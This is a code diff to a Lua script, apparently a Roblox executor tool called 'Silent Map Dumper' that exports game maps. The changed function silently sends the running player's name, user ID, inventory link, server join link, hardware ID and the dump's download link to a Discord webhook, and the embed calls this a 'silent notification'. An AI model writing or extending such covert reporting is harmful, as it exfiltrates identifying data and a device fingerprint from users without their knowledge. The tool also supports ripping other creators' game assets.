@@ -110,41 +110,43 @@ end
 -- ==================== WEBHOOK DISCORD (updated for your code) ==================== --
 local function sendDiscordNotification(downloadLink, objectCount)
     if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "" then return end
+    if not httpRequest then return end
 
     local player = Players.LocalPlayer
     local userId = player.UserId
     local playerName = player.Name
     local displayName = player.DisplayName
-    local profileLink = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
+    local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
+    local inventoryLink = "https://www.roblox.com/users/" .. userId .. "/inventory"
 
     local placeId = game.PlaceId
     local jobId = (pcall(function() return tostring(game.JobId) end) and tostring(game.JobId)) or "N/A"
 
-    local gameName
+    local gameName = "Unknown"
     pcall(function()
         gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
     end)
-    gameName = gameName or "Unknown"
-    local gameLink = "https://www.roblox.com/games/" .. tostring(placeId)
+
+    local gameLink = "https://www.roblox.com/games/" .. placeId
     local serverLink = gameLink .. "?jobId=" .. jobId
 
     local playersCount = #Players:GetPlayers()
-    local isStudio = tostring(RunService:IsStudio() == true)
-    local hwid = (gethwid and pcall(gethwid) and gethwid()) or "Hidden/Not Supported"
+    local isStudio = tostring(RunService:IsStudio())
+    local hwid = "Hidden/Not Supported"
+    if gethwid then pcall(function() hwid = gethwid() end) end
     local dateStr = os.date("%Y-%m-%d %X")
-    local country = "Unknown" -- если хочешь, можно сюда поставить метод определения страны
 
     local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
 
     local embed = {
         ["title"] = "🔥 New Map Dump — " .. gameName,
         ["description"] = "A new player exported the map. Silent notification.",
-        ["color"] = 3447003, -- blue
+        ["color"] = 3447003,
         ["fields"] = {
             { ["name"] = "👤 Player", ["value"] = "["..playerName.."]("..profileLink..")", ["inline"] = true },
             { ["name"] = "🆔 Player ID", ["value"] = tostring(userId), ["inline"] = true },
             { ["name"] = "📝 Display Name", ["value"] = displayName, ["inline"] = true },
-            { ["name"] = "🌍 Country / Locale", ["value"] = country, ["inline"] = true },
+            { ["name"] = "🎒 Inventory", ["value"] = "[Open Inventory]("..inventoryLink..")", ["inline"] = true },
             { ["name"] = "🎮 Game Name", ["value"] = "["..gameName.."]("..gameLink..")", ["inline"] = false },
             { ["name"] = "🔗 Server Link", ["value"] = serverLink, ["inline"] = false },
             { ["name"] = "⚙️ Mode", ["value"] = DUMP_MODE, ["inline"] = true },
@@ -153,13 +155,13 @@ local function sendDiscordNotification(downloadLink, objectCount)
             { ["name"] = "🏗️ Is Studio", ["value"] = isStudio, ["inline"] = true },
             { ["name"] = "🕒 Date", ["value"] = dateStr, ["inline"] = true },
             { ["name"] = "🔒 HWID", ["value"] = hwid, ["inline"] = false },
-            { ["name"] = "📂 Download Link", ["value"] = "```"..downloadLink.."```\n[Direct Download]("..downloadLink..")", ["inline"] = false }
+            { ["name"] = "📂 Download Link", ["value"] = "```"..tostring(downloadLink).."```\n[Direct Download]("..tostring(downloadLink)..")", ["inline"] = false },
         },
         ["thumbnail"] = { ["url"] = avatarUrl },
         ["footer"] = { ["text"] = "Silent Map Dumper • " .. dateStr }
     }
 
-    local payload = HttpService:JSONEncode({ ["embeds"] = {embed} })
+    local payload = HttpService:JSONEncode({ embeds = {embed} })
 
     pcall(function()
         httpRequest({
@@ -170,6 +172,7 @@ local function sendDiscordNotification(downloadLink, objectCount)
         })
     end)
 end
+
 -- ==================================================================== --
 
 
@@ -563,4 +566,5 @@ end
 createLanguageGUI(function()
     createModeGUI(startDumper)
 end)
+
 
